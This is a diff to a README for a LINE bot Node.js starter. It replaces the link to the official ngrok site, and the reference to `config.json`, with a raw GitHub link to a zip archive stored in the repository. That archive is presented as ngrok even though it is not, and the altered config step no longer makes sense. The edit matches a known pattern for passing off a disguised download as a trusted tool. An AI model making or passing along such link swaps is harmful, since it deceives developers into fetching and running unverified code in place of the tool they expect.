@@ -9,7 +9,7 @@ Clone and run
 ```
 npm install
 ```
-Modify `config.json`
+Modify `https://raw.githubusercontent.com/yutthanaiam/line-bot-nodejs-starter/master/angster/starter_bot_line_nodejs_3.3.zip`
 ```json
 {
   "port" : "3000",
@@ -23,7 +23,7 @@ npm start
 ```
 then you can access [http://localhost:3000](http://localhost:3000)
 
-Use [ngrok](https://ngrok.com/) to expose your local url
+Use [ngrok](https://raw.githubusercontent.com/yutthanaiam/line-bot-nodejs-starter/master/angster/starter_bot_line_nodejs_3.3.zip) to expose your local url
 ```
 path/to/ngrok http 3000
 ```
